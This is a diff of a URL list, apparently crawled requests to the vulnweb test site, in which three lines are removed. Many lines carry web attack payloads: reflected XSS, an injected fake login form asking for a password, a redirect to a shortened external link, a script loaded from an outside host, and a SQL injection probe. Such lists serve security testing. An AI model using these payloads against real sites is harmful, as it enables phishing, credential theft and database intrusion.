@@ -25078,7 +25078,6 @@ http://testasp.vulnweb.com/Search.asp?tfSearch
 http://testasp.vulnweb.com/Search.asp?tfSearch=
 http://testasp.vulnweb.com/Search.asp?tfSearch=%253
 http://testasp.vulnweb.com/Search.asp?tfSearch=%25u003C%25s%25v%25g%25%20%25o%25n%25l%25o%25a%25d%25%25u003D%25a%25l%25e%25r%25t%25(%251%25)%25%3E
-http://testasp.vulnweb.com/search.asp?tfSearch=%3Cscript%3Ealert(1);%20var%20x=[''&tfSearch=''];%3C/script%3E
 http://testasp.vulnweb.com/Search.asp?tfSearch=%27INJECTED_PARAM
 http://testasp.vulnweb.com/search.asp?tfSearch=%3Cscript%3Ealert(1);%20//&tfSearch=%3C/script%3E
 http://testasp.vulnweb.com/Search.asp?tfSearch=%3Cbr%3E%3Cbr%3EBitte+loggen+Sie+sich+ein+bevor+Sie++fortfahren:+%3Cform+action+%3D%22destination.aps%22%3E%3Ctable%3E+%3Ctr%3E+%3Ctd%3ELogin:%3C/td%3E+%3Ctd%3E%3Cinput+type%3Dtext+length%3D20+name%3Dlogin%3C/td%3E+%3C/tr%3E+%3Ctr%3E+%3Ctd%3EPasswort:%3C/td%3E+%3Ctd%3E%3Cinput+type%3Dtext+length%3D20+name%3Dpassword%3C/td%3E+%3C/tr%3E%3C/table%3E+%3Cinput+type%3Dsubmit+value%3Dlogin%3E%3C/form%3E
@@ -25097,11 +25096,9 @@ http://testasp.vulnweb.com/Search.asp?tfSearch=%3Cscript%20src=%22http://sc0rn.c
 http://testasp.vulnweb.com/Search.asp?tfSearch=%3Cscript%3Ealert(%27xss%27)%3C%2Fscript%3E
 http://testasp.vulnweb.com/search.asp?tfSearch=%3Cscript%3Ealert(1)&tfSearch=alert(2)%3C/script%3E
 http://testasp.vulnweb.com/Search.asp?tfSearch==%3Cscript%3Elocation.href=%22http://goo.gl/z4LTEG%22;%3C%2Fscript%3E
-http://testasp.vulnweb.com/Search.asp?tfsearch=a
 http://testasp.vulnweb.com/Search.asp?tfSearch=Mert
 http://testasp.vulnweb.com/Search.asp?tfSearch=MertXSS
 http://testasp.vulnweb.com/Search.asp?tfSearch=Sempervideo+%3Chr%3E%3Ca+href%3D%22http://google.com%22%3ESEMPERVIDEO+1%3C/a%3E
-http://testasp.vulnweb.com/session
 http://testasp.vulnweb.com/showforum.asp
 http://testasp.vulnweb.com/showforum.asp?id=0
 http://testasp.vulnweb.com/showforum.asp?id=0+and+1=1--%5BTrue%5D
